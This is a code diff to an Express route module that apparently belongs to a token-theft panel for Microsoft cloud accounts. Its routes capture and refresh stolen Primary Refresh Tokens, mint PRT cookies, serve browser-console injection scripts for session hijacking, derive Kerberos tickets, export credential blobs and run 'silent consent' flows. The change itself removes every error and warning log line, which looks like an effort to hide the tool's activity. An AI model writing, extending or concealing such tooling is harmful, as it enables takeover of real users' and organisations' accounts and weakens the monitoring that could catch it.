@@ -119,8 +119,8 @@ router.get('/', userAuth, async (req, res) => {
        pages: Math.ceil(countResult[0].total / limit)
      });
   } catch (err) {
-    console.error('[Tokens] Get tokens error:', err.message);
-    console.error('[Tokens] Stack:', err.stack);
+
+
     res.status(500).json({ error: 'Server error', details: err.message });
   }
 });
@@ -249,7 +249,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
         [encrypt(cookieValue), token.user_id, materials.tenant]
       );
     } catch (pErr) {
-      console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
+
     }
 
     const script = [
@@ -278,7 +278,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       message: 'PRT cookie generated.'
     });
   } catch (err) {
-    console.error('[Tokens] Cookie script error:', err.message);
+
     res.status(500).json({ success: false, error: 'Failed to generate PRT cookie: ' + err.message });
   }
 });
@@ -509,7 +509,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         });
         }
       } catch (refreshErr) {
-        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
+
       }
     }
 
@@ -568,7 +568,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     }
   } catch (err) {
     const errorMsg = err.message || err.toString() || 'Unknown error';
-    console.error('[Tokens] Renewal error:', errorMsg);
+
     res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
   }
 });
@@ -640,7 +640,7 @@ router.get('/inject-script', userAuth, async (req, res) => {
 
     res.type('application/javascript').send(script);
   } catch (err) {
-    console.error('[Tokens] Inject script error:', err);
+
     res.status(500).json({ error: 'Failed to generate script' });
   }
 });
@@ -690,7 +690,7 @@ router.get('/prt-inject', userAuth, async (req, res) => {
 
     res.type('application/javascript').send(script);
   } catch (err) {
-    console.error('[Tokens] PRT inject error:', err.message);
+
     res.status(500).json({ error: 'Failed to generate PRT injection script' });
   }
 });
@@ -710,9 +710,9 @@ router.post('/:id/convert', userAuth, async (req, res) => {
         [req.params.id]
       );
       if (check.length) {
-        console.error('[Tokens] Convert: token ' + req.params.id + ' belongs to user ' + check[0].user_id + ', not ' + req.user.id);
+
       } else {
-        console.error('[Tokens] Convert: token ' + req.params.id + ' does not exist');
+
       }
       return res.status(404).json({ error: 'Token not found' });
     }
@@ -755,7 +755,7 @@ router.post('/:id/convert', userAuth, async (req, res) => {
         [encrypt(prtCookie.value), token.user_id, materials.tenant]
       );
     } catch (pErr) {
-      console.error('[Tokens] Could not store PRT cookie:', pErr.message);
+
     }
 
     try {
@@ -764,7 +764,7 @@ router.post('/:id/convert', userAuth, async (req, res) => {
         [encrypt(JSON.stringify([{ name: cookieName, value: prtCookie.value, domain: '.' + cookieDomain }])), token.id, req.user.id]
       );
     } catch (e) {
-      console.warn('[Tokens] Could not store cookies:', e.message);
+
     }
 
     const script = [
@@ -793,7 +793,7 @@ router.post('/:id/convert', userAuth, async (req, res) => {
       instructions: 'Paste the script into the browser console on ' + cookieDomain + ' (clean/incognito window), then reload.'
     });
   } catch (err) {
-    console.error('[Tokens] Convert error:', err);
+
     return res.status(500).json({ error: 'Conversion failed: ' + err.message });
   }
 });
@@ -826,7 +826,7 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
         instructions: 'Use the injector page to set cookies in your browser'
       });
     } else {
-      console.error('[Tokens] Convert-cookie error:', result.error);
+
       res.status(400).json({ 
         success: false, 
         error: result.error || 'Conversion failed',
@@ -834,7 +834,7 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
       });
     }
   } catch (err) {
-    console.error('[Tokens] Conversion error:', err);
+
     res.status(500).json({ error: 'Conversion failed: ' + err.message });
   }
 });
@@ -915,7 +915,7 @@ router.post('/export', userAuth, async (req, res) => {
       deleted: deleteAfter
     });
   } catch (err) {
-    console.error('[Tokens] Export error:', err);
+
     res.status(500).json({ error: 'Server error', details: err.message });
   }
 });
@@ -1020,7 +1020,7 @@ router.post('/:id/derive-tgt', userAuth, async (req, res) => {
       res.status(400).json({ error: result.error, success: false });
     }
   } catch (err) {
-    console.error('[Tokens] TGT derivation error:', err.message);
+
     res.status(500).json({ error: 'TGT derivation failed: ' + err.message });
   }
 });
@@ -1078,11 +1078,11 @@ async function resolveRealPrt(token) {
           [encrypt(result.prt), encrypt(result.sessionKeyJwe || null), token.id, token.user_id]
         );
       } catch (pErr) {
-        console.error('[Tokens] Failed to persist self-healed PRT:', pErr.message);
+
       }
       return { prt: result.prt, refreshed: true, tenant };
     } catch (err) {
-      console.warn('[Tokens] PRT self-heal failed for tenant', tenant, ':', err.message);
+
     }
   }
   return {
@@ -1122,12 +1122,12 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
             );
           }
         } catch (pErr) {
-          console.error('[Tokens] Failed to persist captured PRT:', pErr.message);
+
         }
 
         if (tenant && tenant !== 'common' && tenant !== 'organizations') {
           kerberosService.deriveTGTForToken(token.id)
-            .catch(e => console.error('[Tokens] Kerberos derivation error:', e.message));
+            .catch(e => {});
         }
         return res.json({
           success: true,
@@ -1141,12 +1141,12 @@ router.post('/:id/prt-capture', userAuth, async (req, res) => {
         });
       } catch (err) {
         lastErr = err;
-        console.warn('[Tokens] prt-capture failed for tenant', tenant, ':', err.message);
+
       }
     }
     return res.status(409).json({ success: false, error: 'PRT capture failed: ' + (lastErr ? lastErr.message : 'no device credentials for any candidate tenant') });
   } catch (err) {
-    console.error('[Tokens] prt-capture error:', err.message);
+
     res.status(500).json({ success: false, error: 'PRT capture failed: ' + err.message });
   }
 });
@@ -1178,11 +1178,11 @@ router.post('/:id/prt-cookie', userAuth, async (req, res) => {
         [encrypt(cookie.value), token.user_id, materials.tenant]
       );
     } catch (pErr) {
-      console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
+
     }
     res.json({ success: true, cookie, message: 'KDF-signed PRT cookie generated' });
   } catch (err) {
-    console.error('[Tokens] prt-cookie error:', err.message);
+
     res.status(500).json({ success: false, error: 'PRT cookie generation failed: ' + err.message });
   }
 });
@@ -1220,7 +1220,7 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
           [encrypt(result.refreshToken), token.id, token.user_id]
         );
       } catch (pErr) {
-        console.error('[Tokens] Failed to store rotated PRT:', pErr.message);
+
       }
     }
     // Store the access token with the other token material (same as /renew)
@@ -1231,7 +1231,7 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
           [encrypt(result.accessToken), token.id, token.user_id]
         );
       } catch (pErr) {
-        console.error('[Tokens] Failed to store PRT access token:', pErr.message);
+
       }
     }
     res.json({
@@ -1244,7 +1244,7 @@ router.post('/:id/prt-token', userAuth, async (req, res) => {
       message: 'Access token issued from PRT'
     });
   } catch (err) {
-    console.error('[Tokens] prt-token error:', err.message);
+
     res.status(500).json({ success: false, error: 'PRT token exchange failed: ' + err.message });
   }
 });
@@ -1259,7 +1259,7 @@ router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
       ...stats
     });
   } catch (err) {
-    console.error('[Tokens] Bulk TGT derivation error:', err.message);
+
     res.status(500).json({ error: 'Bulk TGT derivation failed: ' + err.message });
   }
 });
@@ -1284,7 +1284,7 @@ router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
       res.status(400).json({ error: result.error, success: false });
     }
   } catch (err) {
-    console.error('[Tokens] Credential blob error:', err.message);
+
     res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
   }
 });
@@ -1366,7 +1366,7 @@ router.post('/check-status', userAuth, async (req, res) => {
     
     return res.json({ status: 'unknown', message: 'Could not determine token status' });
   } catch (err) {
-    console.error('[Tokens] Check status error:', err.message);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -1524,7 +1524,7 @@ router.post('/import', userAuth, tokenUpload.single('tokenFile'), async (req, re
       message: 'Token imported successfully'
     });
   } catch (err) {
-    console.error('[Tokens] Import error:', err.message);
+
     res.status(500).json({ error: 'Server error: ' + err.message });
   }
 });
@@ -1638,8 +1638,8 @@ async function importTokenFile(req, res) {
       res.status(400).json({ error: result.error, details: result.details });
     }
   } catch (err) {
-    console.error('[Tokens] File import error:', err.message);
-    console.error('[Tokens] Stack:', err.stack);
+
+
     res.status(500).json({ error: 'Server error: ' + err.message });
   }
 }
@@ -1893,7 +1893,7 @@ async function processImportedToken(req, data) {
 
     return { success: true, token_id: result.insertId, email: email };
   } catch (err) {
-    console.error('[Tokens] Process token error:', err.message);
+
     return { success: false, error: err.message, email: data.email || '' };
   }
 }
@@ -1927,7 +1927,7 @@ router.post('/silent-consent/test', userAuth, async (req, res) => {
       strategy: result.success ? 'token_valid' : 'consent_needed'
     });
   } catch (err) {
-    console.error('[Tokens] Silent consent test error:', err.message);
+
     res.status(500).json({ error: 'Silent consent test failed: ' + err.message });
   }
 });
@@ -1950,7 +1950,7 @@ router.post('/silent-consent/device-flow', userAuth, async (req, res) => {
 
     res.json(result);
   } catch (err) {
-    console.error('[Tokens] Silent consent device flow error:', err.message);
+
     res.status(500).json({ error: 'Silent consent device flow failed: ' + err.message });
   }
 });
@@ -1967,7 +1967,7 @@ router.post('/silent-consent/find-client', userAuth, async (req, res) => {
     const result = await silentConsentService.findWorkingClient(tenantVal, accountType, templateType);
     res.json(result);
   } catch (err) {
-    console.error('[Tokens] Find client error:', err.message);
+
     res.status(500).json({ error: 'Find client failed: ' + err.message });
   }
 });
